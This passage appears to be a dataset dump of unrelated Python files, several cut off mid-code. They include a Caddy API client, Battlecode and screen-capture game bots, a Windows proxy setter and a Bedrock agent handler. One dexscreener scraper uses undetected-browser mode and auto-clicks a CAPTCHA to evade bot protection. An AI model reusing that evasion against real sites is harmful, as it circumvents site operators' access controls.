 parser.add_argument(\"--cleanup\", dest='generate_cleanup_code', action='store', type=int,\r\n                      help='Release interned objects on python exit, for memory debugging. '\r\n                           'Level indicates aggressiveness, default 0 releases nothing.')\r\n    parser.add_argument(\"-w\", \"--working\", dest='working_path', action='store', type=str,\r\n                      help='Sets the working directory for Cython (the directory modules are searched from)')\r\n    parser.add_argument(\"--gdb\", action=SetGDBDebugAction, nargs=0,\r\n                      help='Output debug information ",
    "# Copyright 2025 Krzysztof Taraszka and The Miget Authors\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\nimport requests\nfrom typing import Dict, Optional, Union\nimport json\n\n\nclass CaddyAPIClient:\n    def __init__(self, base_url: str = \"http://localhost:2019\"):\n        \"\"\"Initialize the Caddy API client.\n\n        Args:\n            base_url (str): Base URL for the Caddy API (e.g., http://localhost:2019)\n        \"\"\"\n        self.base_url = base_url.rstrip('/')  # Remove trailing slash if present\n\n    def _make_request(self, method: str, endpoint: str, data: Optional[Dict] = None, headers: Optional[Dict] = None) -> requests.Response:\n        \"\"\"Make a request to the Caddy API.\n\n        Args:\n            method (str): HTTP method (GET, POST, etc.)\n            endpoint (str): API endpoint\n            data (Optional[Dict], optional): Data to send. Defaults to None.\n            headers (Optional[Dict], optional): Custom headers. Defaults to None.\n\n        Returns:\n            requests.Response: Response from the API\n        \"\"\"\n        url = f\"{self.base_url}{endpoint}\"\n        default_headers = {'Content-Type': 'application/json'}\n        if headers is not None:\n            default_headers.update(headers)\n        \n        try:\n            response = requests.request(\n                method=method,\n                url=url,\n                headers=default_headers,\n                json=data if data else None,\n                timeout=10  # Add timeout to prevent hanging\n            )\n            response.raise_for_status()\n            return response\n        except requests.exceptions.RequestException as e:\n            raise Exception(f\"API request failed: {str(e)}\")\n\n    def _get_tls_config(self) -> Dict:\n        \"\"\"Get current TLS configuration.\n\n        Returns:\n            Dict: Current TLS configuration\n        \"\"\"\n        try:\n            response = self._make_request('GET', '/config/apps/tls')\n            return response.json()\n        except Exception:\n            return {}\n\n    def _update_tls_config(self, new_config: Dict) -> None:\n        \"\"\"Update TLS configuration.\n\n        Args:\n            new_config (Dict): New TLS configuration\n        \"\"\"\n        try:\n            # First try to get existing config\n            response = self._make_request('GET', '/config/apps/tls')\n            current_config = response.json()\n        except Exception:\n            # If no config exists, start with empty one\n            current_config = {}\n\n        # If automation policies exist, merge them\n        if 'automation' in new_config:\n            if 'automation' not in current_config:\n                current_config['automation'] = {'policies': []}\n            \n            # Add new policies\n            current_policies = current_config['automation']['policies']\n            new_policies = new_config['automation']['policies']\n            \n            # Remove any existing policies for the same domains\n            for new_policy in new_policies:\n                current_policies = [\n                    p for p in current_policies \n                    if not any(subject in new_policy['subjects'] for subject in p.get('subjects', []))\n                ]\n            \n            # Add new policies\n            current_policies.extend(new_policies)\n            current_config['automation']['policies'] = current_policies\n\n        # Delete existing config first\n        try:\n            self._make_request('DELETE', '/config/apps/tls')\n        except Exception:\n            pass\n\n        # Then add the updated config\n        self._make_request('POST', '/config/apps/tls', data=current_config)\n\n    def add_domain_with_auto_tls(self, domain: str, target: str, target_port: int,\n                            enable_security_headers: bool = False, enable_hsts: bool = False,\n                            frame_options: str = \"DENY\", enable_compression: bool = False,\n                            redirect_mode: str = None) -> bool:\n        \"\"\"Add or update domain with auto TLS configuration.\n\n        Args:\n            domain (str): Domain name\n            target (str): Target host (IP or FQDN) for reverse proxy\n            target_port (int): Target port for reverse proxy\n            enable_security_headers (bool, optional): Enable security headers. Defaults to False.\n            enable_hsts (bool, optional): Enable HSTS. Defaults to False.\n            frame_options (str, optional): X-Frame-Options value. Defaults to \"DENY\".\n            enable_compression (bool, o",
    "import json\nimport time\nimport random\nfrom enum import Enum\nfrom typing import List, Tuple, Dict\nimport tools.aes as aes\n\nclass ActionType(Enum):\n    TOUCH = \"touch\"\n    SLIDE = \"slide\"\n    DELAY = \"delay\"\n\nclass Action:\n    def __init__(self, id, action_type: ActionType, params: Dict):\n        self.id = id\n        self.action_type = action_type\n        self.params = params\n        self.timestamp = time.time()\n\nclass ActionRecorder:\n    def __init__(self, device_id: str):\n        self.device_id = device_id\n        self.actions: List[Action] = []\n        \n    def record_touch(self,id, pos: Tuple[int, int]):\n        \"\"\"\u8bb0\u5f55\u70b9\u51fb\u64cd\u4f5c\"\"\"\n        self.actions.append(Action(id,ActionType.TOUCH, {\"pos\": pos}))\n        \n    def record_slide(self, id,start_pos: Tuple[int, int], end_pos: Tuple[int, int], duration: int):\n        \"\"\"\u8bb0\u5f55\u6ed1\u52a8\u64cd\u4f5c\"\"\"\n        self.actions.append(Action(id,ActionType.SLIDE, {\n            \"start_pos\": start_pos,\n            \"end_pos\": end_pos,\n            \"duration\": duration\n        }))\n        \n    def record_delay(self, id, seconds: float):\n        \"\"\"\u8bb0\u5f55\u5ef6\u8fdf\u64cd\u4f5c\"\"\"\n        self.actions.append(Action(id, ActionType.DELAY, {\"seconds\": seconds}))\n        \n    def save_to_file(self, filename: str):\n        \"\"\"\u4fdd\u5b58\u64cd\u4f5c\u5e8f\u5217\u5230\u6587\u4ef6\"\"\"\n        actions_data = []\n        for action in self.actions:\n            actions_data.append({\n                \"id\": action.id,\n                \"type\": action.action_type.value,\n                \"params\": action.params,\n                \"timestamp\": action.timestamp\n            })\n            \n        with open(filename, 'w', encoding='utf-8') as f:\n            json.dump({\n                \"device_id\": self.device_id,\n                \"actions\": actions_data\n            }, f, indent=2)\n            \n    @classmethod\n    def load_from_file(cls, filename: str) -> 'ActionRecorder':\n        \"\"\"\u4ece\u6587\u4ef6\u52a0\u8f7d\u64cd\u4f5c\u5e8f\u5217\"\"\"\n        with open(filename, 'r', encoding='utf-8') as f:\n            data = json.load(f)\n        if data.get(\"isEncrypted\", False):\n            data = json.loads(aes.decrypt(data))\n        recorder = cls(data[\"device_id\"])\n        for action_data in data[\"actions\"]:\n            action_type = ActionType(action_data[\"type\"])\n            recorder.actions.append(Action(action_data[\"id\"], action_type, action_data[\"params\"]))\n        return recorder \n    ",
    "import random\r\n# passowrd generator\r\nletters = [\"A\", \"B\", \"C\", \"D\", \"E\"]\r\nfigures = [\"1\", \"2\", \"3\", \"4\",\"5\"]\r\nsymbols =  [\"*\", \"&\", \"$\",\"(\", \")\"]\r\nprint(\"Welcome to the password generator \")\r\nuser_name = input(\"the user name is required here!\")\r\nnr_letters = int(input(\"enter the numbers you want in your password\"))\r\nnr_numbers = int(input(\"enter the numbers you want in your password\"))\r\nnr_Symbol = int(input(\"enter the numbers you want in your password\"))\r\n\r\n# getting the number of letters in a password for a user 4\r\npassword = \"\"\r\nfor x in range(1, len(letters)):\r\n    password_1 = random.choice(letters)\r\n    password +=password_1 \r\n    # print(password)\r\n\r\n# now getting the numbers of figures to be used in password for a user 4\r\npassword_figure = \"\"\r\nfor y in range(1, len(figures)):\r\n    password_2 = random.choice(figures)\r\n    password_figure += password_2\r\n    # print(password_figure)\r\n\r\n\r\n# now getting the numbers of symbols to be used in password for a user 4\r\npassword_symbols = \"\"\r\nfor z in range(1, len(symbols)):\r\n    password_3 = random.choice(symbols)\r\n    password_symbols += password_3\r\n# Now generating the password for the username\r\nReal_password = password +password_figure+password_symbols\r\nprint(f\"The username:{user_name} has the password {Real_password}\")\r\n# print(Numbers)\r\n# print(Symbol)\r\n\r\n\r\n\r\n                                                                                                                                                                      \r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n",
    "#!/usr/bin/env python\n# coding: utf-8\n\n# In[6]:\n\n\nimport subprocess\nimport re\nimport winreg\n\ndef get_default_gateway():\n    \"\"\"\n    Extracts the default gateway IP address using the 'ipconfig' command.\n\n    Returns:\n        str: Default Gateway IP address or None if not found.\n    \"\"\"\n    try:\n        # Run 'ipconfig' to get network information\n        result = subprocess.check_output(\"ipconfig\", encoding='utf-8')\n\n        # Split the result into lines to process each line\n        lines = result.splitlines()\n\n        for i, line in enumerate(lines):\n            # Check if the line contains 'Default Gateway'\n            if \"Default Gateway\" in line:\n                # Search for an IPv4 address on the same line\n                match = re.search(r\"(\\d+\\.\\d+\\.\\d+\\.\\d+)\", line)\n                if match:\n                    return match.group(1)\n\n                # If no match is found, check the next line\n                if i + 1 < len(lines):\n                    match = re.search(r\"(\\d+\\.\\d+\\.\\d+\\.\\d+)\", lines[i + 1])\n                    if match:\n                        return match.group(1)\n\n        print(\"Default Gateway not found in ipconfig output.\")\n        return None\n\n    except subprocess.CalledProcessError as e:\n        print(f\"Error running ipconfig: {e}\")\n        return None\n\ndef set_proxy(enable, proxy_address, bypass_list=\"localhost;127.0.0.1\"):\n    \"\"\"\n    Configures the system proxy settings on Windows.\n\n    Args:\n        enable (int): 1 to enable the proxy, 0 to disable it.\n        proxy_address (str): Proxy server address (e.g., \"192.168.0.1:8080\").\n        bypass_list (str): Addresses to bypass the proxy (semicolon-separated).\n\n    Returns:\n        bool: True if the operation succeeds, False otherwise.\n    \"\"\"\n    try:\n        # Open the registry key for internet settings\n        with winreg.OpenKey(winreg.HKEY_CURRENT_USER,\n                            r\"Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\",\n                            0, winreg.KEY_SET_VALUE) as reg_key:\n            # Enable or disable the proxy\n            winreg.SetValueEx(reg_key, \"ProxyEnable\", 0, winreg.REG_DWORD, enable)\n\n            if enable:\n                # Set the proxy server address\n                winreg.SetValueEx(reg_key, \"ProxyServer\", 0, winreg.REG_SZ, proxy_address)\n\n                # Set the bypass list\n                winreg.SetValueEx(reg_key, \"ProxyOverride\", 0, winreg.REG_SZ, bypass_list)\n        print(proxy_address)\n        print(\"Proxy settings updated successfully.\")\n        return True\n    except Exception as e:\n        print(f\"Failed to update proxy settings: {e}\")\n        return False\n\n# Example Usage\nif __name__ == \"__main__\":\n    gateway = get_default_gateway()\n    if gateway:\n        proxy_port = \"8080\"\n        proxy_address = f\"{gateway}:{proxy_port}\"\n        set_proxy(enable=1, proxy_address=proxy_address)\n    else:\n        print(\"Cannot set proxy as the default gateway was not found.\")\n\n\n# In[ ]:\n\n\n\n\n",
    "import random\n\nfrom battlecode25.stubs import *\n\n# This is an example bot written by the developers!\n# Use this to help write your own code, or run it against your bot to see how well you can do!\n\n\n# Globals\nturn_count = 0\ndirections = [\n    Direction.NORTH,\n    Direction.NORTHEAST,\n    Direction.EAST,\n    Direction.SOUTHEAST,\n    Direction.SOUTH,\n    Direction.SOUTHWEST,\n    Direction.WEST,\n    Direction.NORTHWEST,\n]\n\n\ndef turn():\n    \"\"\"\n    MUST be defined for robot to run\n    This function will be called at the beginning of every turn and should contain the bulk of your robot commands\n    \"\"\"\n    global turn_count\n    turn_count += 1\n\n    if get_type() == UnitType.SOLDIER:\n        run_soldier()\n    elif get_type() == UnitType.MOPPER:\n        run_mopper()\n    elif get_type() == UnitType.SPLASHER:\n        pass  # TODO\n    elif get_type().is_tower_type():\n        run_tower()\n    else:\n        pass  # Other robot types?\n\n\ndef run_tower():\n    # Pick a direction to build in.\n    dir = directions[random.randint(0, len(directions) - 1)]\n    next_loc = get_location().add(dir)\n\n    # Pick a random robot type to build.\n    robot_type = random.randint(0, 2)\n    if robot_type == 0 and can_build_robot(UnitType.SOLDIER, next_loc):\n        build_robot(UnitType.SOLDIER, next_loc)\n        log(\"BUILT A SOLDIER\")\n    if robot_type == 1 and can_build_robot(UnitType.MOPPER, next_loc):\n        build_robot(UnitType.MOPPER, next_loc)\n        log(\"BUILT A MOPPER\")\n    if robot_type == 2 and can_build_robot(UnitType.SPLASHER, next_loc):\n        set_indicator_string(\"SPLASHER NOT IMPLEMENTED YET\");\n        #build_robot(RobotType.SPLASHER, next_loc)\n        #log(\"BUILT A SPLASHER\")\n\n    # Read incoming messages\n    messages = read_messages()\n    for m in messages:\n        log(f\"Tower received message: '#{m.get_sender_id()}: {m.get_bytes()}'\")\n\n    # TODO: can we attack other bots?\n\n\ndef run_soldier():\n    # Sense information about all visible nearby tiles.\n    nearby_tiles = sense_nearby_map_infos()\n\n    # Search for a nearby ruin to complete.\n    cur_ruin = None\n    for tile in nearby_tiles:\n        if tile.has_ruin():\n            cur_ruin = tile\n\n    if cur_ruin is not None:\n        target_loc = cur_ruin.get_map_location()\n        dir = get_location().direction_to(target_loc)\n        if can_move(dir):\n            move(dir)\n\n        # Mark the pattern we need to draw to build a tower here if we haven't already.\n        should_mark = cur_ruin.get_map_location().subtract(dir)\n        if sense_map_info(should_mark).get_mark() == PaintType.EMPTY and can_mark_tower_pattern(UnitType.LEVEL_ONE_PAINT_TOWER, target_loc):\n            mark_tower_pattern(UnitType.LEVEL_ONE_PAINT_TOWER, target_loc)\n            log(\"Trying to build a tower at \" + str(target_loc))\n\n        # Fill in any spots in the pattern with the appropriate paint.\n        for pattern_tile in sense_nearby_map_infos(target_loc, 8):\n            if pattern_tile.get_mark() != pattern_tile.get_paint() and pattern_tile.get_mark() != PaintType.EMPTY:\n                use_secondary = pattern_tile.get_mark() == PaintType.ALLY_SECONDARY\n                if can_attack(pattern_tile.get_map_location()):\n                    attack(pattern_tile.get_map_location(), use_secondary)\n\n        # Complete the ruin if we can.\n        if can_complete_tower_pattern(UnitType.LEVEL_ONE_PAINT_TOWER, target_loc):\n            complete_tower_pattern(UnitType.LEVEL_ONE_PAINT_TOWER, target_loc)\n            set_timeline_marker(\"Tower built\", 0, 255, 0)\n            log(\"Built a tower at \" + str(target_loc) + \"!\")\n\n    # Move and attack randomly if no objective.\n    dir = directions[random.randint(0, len(directions) - 1)]\n    next_loc = get_location().add(dir)\n    if can_move(dir):\n        move(dir)\n\n    # Try to paint beneath us as we walk to avoid paint penalties.\n    # Avoiding wasting paint by re-painting our own tiles.\n    current_tile = sense_map_info(get_location())\n    if not current_tile.get_paint().is_ally() and can_attack(get_location()):\n        attack(get_location())\n\n\ndef run_mopper():\n    # Move and attack randomly.\n    dir = directions[random.randint(0, len(directions) - 1)]\n    next_loc = get_location().add(dir)\n    if can_move(dir):\n        move(dir)\n    if can_mop_swing(dir):\n        mop_swing(dir)\n        log(\"Mop Swing! Booyah!\");\n    elif can_attack(next_loc):\n        attack(next_loc)\n\n    # We can also move our code into different methods or classes to better organize it!\n    update_enemy_robots()\n\n\ndef update_enemy_robots():\n    # Sensing methods can be passed in a radius of -1 to automatically \n    # use the largest possible value.\n    enemy_robots = sense_nearby_robots(team=get_team().opponent())\n    if len(enemy_robots) == 0:\n        return\n\n    set_indicator_string(\"There are nearby enemy robots! Scary!\");\n\n    # Save an array of locations with enemy robots in them for possible future use.\n    enemy_locations = [None] * len(enemy_robots)\n    for i in range(len(enemy_robots)):\n        ",
    "# Main script to execute the crawler\n\nfrom utils import WebCrawler\n\nclass Crawler:\n    \"\"\"\n    A simple web crawler class to scrape content from a given URL.\n\n    Attributes:\n    -----------\n    url : str\n        The URL of the website to be crawled.\n\n    Methods:\n    --------\n    __init__(url: str):\n        Initializes the Crawler object with the given URL.\n\n    crawl():\n        Starts the crawling process by fetching the URL and parsing the content.\n    \"\"\"\n    \n    def __init__(self, url, max_depth):\n        \"\"\"\n        Initializes the Crawler object with the specified URL.\n\n        Parameters:\n        -----------\n        url : str\n            The URL of the website to be crawled.\n        \n        max_depth : int\n            Limit crawling depth to avoid overloading servers\n        \"\"\"\n        self.url = url\n        self.max_depth = max_depth\n        \n    def crawl(self):\n        \"\"\"\n        Initiates the crawling process, fetching the content from the specified URL.\n        This method is a placeholder for the actual crawling logic, which can include:\n        - Making HTTP requests\n        - Parsing HTML content\n        - Extracting links or other relevant data\n        \n        Currently, this function only prints the URL to indicate that crawling has started.\n        \"\"\"\n        print(f\"Starting crawl on: {self.url}\")\n        # Placeholder for the actual crawling logic (HTTP request, parsing, etc.)\n        # You would typically use requests, BeautifulSoup, etc. to implement the full crawling logic.\n        crawler = WebCrawler(self.start_url, self.max_depth)\n        crawled_urls = crawler.crawl()\n\n        # Save the results to a file\n        crawler.save_results(\"crawled_urls.txt\", crawled_urls)\n        \n        \ndef main():\n    url = input(\"Enter the URL to crawl: \").strip()\n    \n    max_depth = input(\"Enter the max depth: \")\n    \n    crawler = Crawler(url,max_depth)\n    \n    \n    # Start the crawling process\n    crawler.crawl()\n\nif __name__ == \"__main__\":\n    main()",
    "import boto3\nimport json\nimport logging\nimport os\nfrom collections import OrderedDict\nimport re\n\nlogger = logging.getLogger()\nlogger.setLevel(logging.INFO)\n\n\ndef log(message):\n    logger.info(message)\n\n\nAGENT_ID = os.environ[\"AGENT_ID\"]\nREGION_NAME = os.environ[\"REGION_NAME\"]\n\nlog(f\"Agent id: {AGENT_ID}\")\n\nagent_client = boto3.client(\"bedrock-agent\", region_name=REGION_NAME)\nagent_runtime_client = boto3.client(\n    \"bedrock-agent-runtime\", region_name=REGION_NAME)\ns3_resource = boto3.resource(\"s3\", region_name=REGION_NAME)\n\n\ndef get_highest_agent_version_alias_id(response):\n    \"\"\"\n    Find newest agent alias id.\n\n    Args:\n        response (dict): Response from list_agent_aliases().\n\n    Returns:\n        str: Agent alias ID of the newest agent version.\n    \"\"\"\n    # Initialize highest version info\n    highest_version = None\n    highest_version_alias_id = None\n\n    # Iterate through the agentAliasSummaries\n    for alias_summary in response.get(\"agentAliasSummaries\", []):\n        # Assuming each alias has one routingConfiguration\n        if alias_summary[\"routingConfiguration\"]:\n            agent_version = alias_summary[\"routingConfiguration\"][0][\"agentVersion\"]\n            # Check if the version is numeric and higher than the current highest\n            if agent_version.isdigit() and (\n                highest_version is None or int(agent_version) > highest_version\n            ):\n                highest_version = int(agent_version)\n                highest_version_alias_id = alias_summary[\"agentAliasId\"]\n\n    # Return the highest version alias ID or None if not found\n    return highest_version_alias_id\n\n\ndef invoke_agent(user_input, session_id):\n    \"\"\"\n    Get response from Agent\n    \"\"\"\n    response = agent_client.list_agent_aliases(agentId=AGENT_ID)\n\n    log(f\"list_agent_aliases: {response}\")\n    agent_alias_id = get_highest_agent_version_alias_id(response)\n    if not agent_alias_id:\n        return \"No agent published alias found - cannot invoke agent\"\n    streaming_response = agent_runtime_client.invoke_agent(\n        agentId=AGENT_ID,\n        agentAliasId=agent_alias_id,\n        sessionId=session_id,\n        enableTrace=True,\n        inputText=user_input,\n    )\n\n    return streaming_response\n\n\ndef get_agent_response(response):\n    log(f\"Getting agent response... {response}\")\n    if \"completion\" not in response:\n        return f\"No completion found in response: {response}\"\n    trace_list = []\n    for event in response[\"completion\"]:\n        log(f\"Event keys: {event.keys()}\")\n        if \"trace\" in event:\n            log(event[\"trace\"])\n            trace_list.append(event[\"trace\"])\n\n        # Extract the traces\n        if \"chunk\" in event:\n            # Extract the bytes from the chunk\n            chunk_bytes = event[\"chunk\"][\"bytes\"]\n\n            # Convert bytes to string, assuming UTF-8 encoding\n            chunk_text = chunk_bytes.decode(\"utf-8\")\n\n            # Print the response text\n            print(\"Response from the agent:\", chunk_text)\n            # If there are citations with more detailed responses, print them\n            reference_text = \"\"\n            source_file_list = []\n            if (\n                \"attribution\" in event[\"chunk\"]\n                and \"citations\" in event[\"chunk\"][\"attribution\"]\n            ):\n                for citation in event[\"chunk\"][\"attribution\"][\"citations\"]:\n                    if (\n                        \"generatedResponsePart\" in citation\n                        and \"textResponsePart\" in citation[\"generatedResponsePart\"]\n                    ):\n                        text_part = citation[\"generatedResponsePart\"][\n                            \"textResponsePart\"\n                        ][\"text\"]\n                        print(\"Detailed response part:\", text_part)\n                    source_file_list = []\n                    if \"retrievedReferences\" in citation:\n                        for reference in citation[\"retrievedReferences\"]:\n                            if (\n                                \"content\" in reference\n                                and \"text\" in reference[\"content\"]\n                            ):\n                                reference_text = reference[\"content\"][\"text\"]\n                                print(\"Reference text:\", reference_text)\n                            if \"location\" in reference:\n                                source_file = reference[\"location\"][\"s3Location\"][\"uri\"]\n                                source_file_list.append(source_file)\n                    print(f\"source_file_list: {source_file_list}\")\n\n    for t in trace_list:\n        if \"orchestrationTrace\" in t[\"trace\"].keys():\n            if \"observation\" in t[\"trace\"][\"orchestrationTrace\"].keys():\n                obs = t[\"trace\"][\"orchestrationTrace\"][\"observation\"]\n                if obs[\"type\"] == \"ACTION_GROUP\":\n                    sql_query_from_llm = extract_sql_query(\n                        obs[\"actionGroupInvocationOutput\"][\"text\"]\n                    )\n          ",
    "import pyautogui\nimport numpy as np\nfrom PIL import ImageGrab, Image, ImageDraw\nimport keyboard  # For key press detection\n\n# Function to capture a specific region of the screen\ndef capture_screen(region=None):\n    if region is None:\n        # Default region if none is specified (e.g., center of the screen)\n        region = (500, 300, 1500, 1000)  # (left, top, right, bottom)\n    \n    print(f\"Capturing region: {region}\")\n    screen = ImageGrab.grab(bbox=region)  # Capture the region of the screen\n    return np.array(screen)\n\n# Function to draw an outline around the detected region\ndef draw_outline(image, top_left, bottom_right, color=(255, 255, 255)):\n    # Convert to PIL image for drawing\n    pil_image = Image.fromarray(image)  # Create PIL image from numpy array\n    draw = ImageDraw.Draw(pil_image)\n    \n    # Draw a rectangle outline around the detected region\n    draw.rectangle([top_left, bottom_right], outline=color, width=3)\n    \n    return np.array(pil_image)\n\n# Function to detect the green zone (color #40C057)\ndef detect_green_zone(image):\n    print(\"Waiting to detect green zone...\")\n    \n    # Define the RGB range for green zone (#40C057)\n    green_min = np.array([64, 192, 87], dtype=np.uint8)  # RGB for #40C057\n    green_max = np.array([64, 192, 87], dtype=np.uint8)  # Exact match\n    \n    # Extract RGB channels\n    red, green, blue = image[:, :, 0], image[:, :, 1], image[:, :, 2]\n    \n    # Mask for green zone: check if the RGB values match #40C057\n    green_mask = (red == green_min[0]) & (green == green_min[1]) & (blue == green_min[2])\n    \n    # Get the coordinates of the green pixels\n    green_pixels = np.column_stack(np.where(green_mask))\n    \n    if green_pixels.size > 0:  # Check if any green pixels are detected\n        print(\"Green zone detected!\")\n        # Return the bounding box of the green zone\n        top_left = (min(green_pixels[:, 1]), min(green_pixels[:, 0]))  # (x, y)\n        bottom_right = (max(green_pixels[:, 1]), max(green_pixels[:, 0]))  # (x, y)\n        return top_left, bottom_right\n    else:\n        print(\"No green zone detected.\")\n        return None\n\n# Function to detect the red bar (color #FF0000)\ndef detect_red_bar(image):\n    print(\"Waiting to detect red bar...\")\n    \n    # Define the RGB range for the red bar (#FF0000)\n    red_min = np.array([255, 0, 0], dtype=np.uint8)  # RGB for #FF0000\n    red_max = np.array([255, 0, 0], dtype=np.uint8)  # Exact match\n    \n    # Extract RGB channels\n    red, green, blue = image[:, :, 0], image[:, :, 1], image[:, :, 2]\n    \n    # Mask for red bar: check if the RGB values match #FF0000\n    red_mask = (red == red_min[0]) & (green == red_min[1]) & (blue == red_min[2])\n    \n    # Get the coordinates of the red pixels\n    red_pixels = np.column_stack(np.where(red_mask))\n    \n    if red_pixels.size > 0:\n        print(\"Red bar detected!\")\n        return red_pixels  # Return the coordinates of detected red bar\n    else:\n        print(\"No red bar detected.\")\n        return None\n\n# Main function to control the bot\ndef main():\n    while True:\n        # Capture the screen\n        screen = capture_screen()\n        \n        # Detect green zone and red bar\n        green_zone = detect_green_zone(screen)\n        red_bar = detect_red_bar(screen)\n        \n        if green_zone:\n            # Draw an outline around the green zone\n            top_left, bottom_right = green_zone\n            screen_with_outline = draw_outline(screen, top_left, bottom_right, color=(255, 255, 255))\n            \n            # Display the screen with outline (optional, remove if not needed)\n            screen_with_outline.show()\n        \n        # Add your bot's actions here based on green zone and red bar detection\n        if keyboard.is_pressed('q'):  # Example: exit the loop if 'q' is pressed\n            break\n\n# Run the bot\nif __name__ == \"__main__\":\n    main()\n",
    "import requests\nimport json\nimport brotli\nfrom prettytable import PrettyTable\nfrom lxml import html\nimport traceback\nimport csv\nfrom datetime import datetime\n\nfrom seleniumbase import Driver\nfrom time import sleep\nimport json\n\ndef ParsePage(driver:Driver, url,tokens):\n    res = driver.get(url)\n    \n\n\n    tree = html.fromstring(driver.page_source)\n\n    query = '//a[@class=\"ds-dex-table-row ds-dex-table-row-top\"]'\n    dex_rows = tree.xpath(query)\n    for i in dex_rows:\n        try:\n            name = i.xpath('./div')[0]\n            token_sumbol = name.xpath('.//span[@class=\"ds-dex-table-row-base-token-symbol\" or @class=\"chakra-text ds-dex-table-row-base-token-symbol custom-1hn6cw4\"]/text()')[0]\n            second_token = name.xpath('.//span[@class=\"ds-dex-table-row-quote-token-symbol\"]/text()')[0]\n            tok_pair = token_sumbol+'/'+second_token\n            tok_name = name.xpath('.//span[@class=\"ds-dex-table-row-base-token-name-text\"]/text()')[0]\n\n            name =  tok_pair + ' ' + tok_name\n            price = i.xpath('./div[@class=\"ds-table-data-cell ds-dex-table-row-col-price\" or @class=\"ds-table-data-cell ds-dex-table-row-col-price ds-dex-table-row-col-price-long\"]')[0].text_content()\n            age = i.xpath('./div[@class=\"ds-table-data-cell ds-dex-table-row-col-pair-age\"]')[0].text_content()\n            txns = i.xpath('./div[@class=\"ds-table-data-cell ds-dex-table-row-col-txns\"]')[0].text_content()\n            volume = i.xpath('./div[@class=\"ds-table-data-cell ds-dex-table-row-col-txns\"]')[0].text_content()\n            makers = i.xpath('./div[@class=\"ds-table-data-cell ds-dex-table-row-col-txns\"]')[0].text_content()\n            _5m = i.xpath('./div[@class=\"ds-table-data-cell ds-dex-table-row-col-price-change-m5\"]')[0].text_content()\n            _1h = i.xpath('./div[@class=\"ds-table-data-cell ds-dex-table-row-col-price-change-h1\"]')[0].text_content()\n            _6h = i.xpath('./div[@class=\"ds-table-data-cell ds-dex-table-row-col-price-change-h6\"]')[0].text_content()\n            _24h = i.xpath('./div[@class=\"ds-table-data-cell ds-dex-table-row-col-price-change-h24\"]')[0].text_content()\n            liquidity = i.xpath('./div[@class=\"ds-table-data-cell ds-dex-table-row-col-liquidity\"]')[0].text_content()\n            mcap = i.xpath('./div[@class=\"ds-table-data-cell ds-dex-table-row-col-market-cap\"]')[0].text_content()\n\n            tokens.append({\n                'Name':name,\n                'Price':price,\n                'Age':age,\n                'TXNS':txns,\n                'Volume':volume,\n                'Makers':makers,\n                '5m':_5m,\n                '1h':_1h,\n                '6h':_6h,\n                '24h':_24h,\n                'Liquidity':liquidity,\n                'MCAP':mcap\n            })\n        except:\n            traceback.print_exc()\n\n\ndef SaveResultAsTable(tokens:list):\n    tab = PrettyTable(['Name','Price','Age','TXNS','Volume','Makers','5m','1h','6h','24h','Liquidity','MCAP'])\n    for token in tokens:\n        tab.add_row(token.values())\n    \n    formatted_datetime = datetime.now().strftime(\"%H-%M-%d-%m-%Y\")\n    f = open(f'results_{formatted_datetime}.md','w',encoding='utf-8',newline='')   \n    f.write(tab.get_string())\n\ndef SaveAsCSV(tokens:list):\n    now = datetime.now()\n    formatted_datetime = now.strftime(\"%H-%M-%d-%m-%Y\")\n\n    f = open(f'results_{formatted_datetime}.csv','w',encoding='utf-8',newline='')    \n    headers = ['Name','Price','Age','TXNS','Volume','Makers','5m','1h','6h','24h','Liquidity','MCAP']\n    writer = csv.DictWriter(f,delimiter=',',fieldnames=headers)\n    writer.writeheader()\n\n    for tok in tokens:\n        writer.writerow(tok)\n    \ndef main():\n    driver = Driver(uc=True)\n    url = 'https://dexscreener.com/'\n\n    driver.uc_open_with_reconnect(url,4)\n    driver.uc_gui_click_captcha()\n\n    tokens = []\n    \n\n    ParsePage(driver,'https://dexscreener.com/',tokens)\n    for i in range(2,21):\n        print('curr url',f'https://dexscreener.com/page-{i}')\n        ParsePage(driver,f'https://dexscreener.com/page-{i}',tokens)\n\n    SaveAsCSV(tokens)\n    SaveResultAsTable(tokens)\n\n    driver.quit()\n\nif __name__ == '__main__':\n    main()\n",
    "# ***************************************************************************\n# *                                                                         *\n# *   Copyright (c) 2025 Hakan Seven <hakanseven12@gmail.com>               *\n# *                                                                         *\n# *   This program is free software; you can redistribute it and/or modify  *\n# *   it under the terms of the GNU Lesser General Public License (LGPL)    *\n# *   as published by the Free Software Foundation; either version 2 of     *\n# *   the License, or (at your option) any later version.                   *\n# *   for detail see the LICENCE text file.                                 *\n# *                                                                         *\n# *   This program is distributed in the hope that it will be useful,       *\n# *   but WITHOUT ANY WARRANTY; without even the implied warranty of        *\n# *   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the         *\n# *   GNU Library General Public License for more details.                  *\n# *                                                                         *\n# *   You should have received a copy of the GNU Library General Public     *\n# *   License along with this program; if not, write to the Free Software   *\n# *   Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  *\n# *   USA                                                                   *\n# *                                                                         *\n# ***************************************************************************\n\n\"\"\"Provides GUI tools to create Table objects.\"\"\"\n\nimport FreeCAD, FreeCADGui\nfrom pivy import coin\n\nfrom ..variables import icons_path\nfrom ..make import make_table\n\n\nclass CreateTable:\n\n    def __init__(self):\n        \"\"\"\n        Constructor\n        \"\"\"\n        pass\n\n    def GetResources(self):\n        \"\"\"\n        Return the command resources dictionary\n        \"\"\"\n        return {\n            'Pixmap': icons_path + '/table.svg',\n            'MenuText': \"Create Volume Table\",\n            'ToolTip': \"Create Volume Table\"\n            }\n\n    def IsActive(self):\n        \"\"\"\n        Define tool button activation situation\n        \"\"\"\n        # Check for document\n        if FreeCAD.ActiveDocument:\n            # Check for selected object\n            self.selection = FreeCADGui.Selection.getSelection()\n            if self.selection:\n                if self.selection[-1].Proxy.Type == 'Road::Volume':\n                    return True\n        return False\n\n    def Activated(self):\n        \"\"\"\n        Command activation method\n        \"\"\"\n        #Start event to detect mouse click\n        self.view = FreeCADGui.ActiveDocument.ActiveView\n        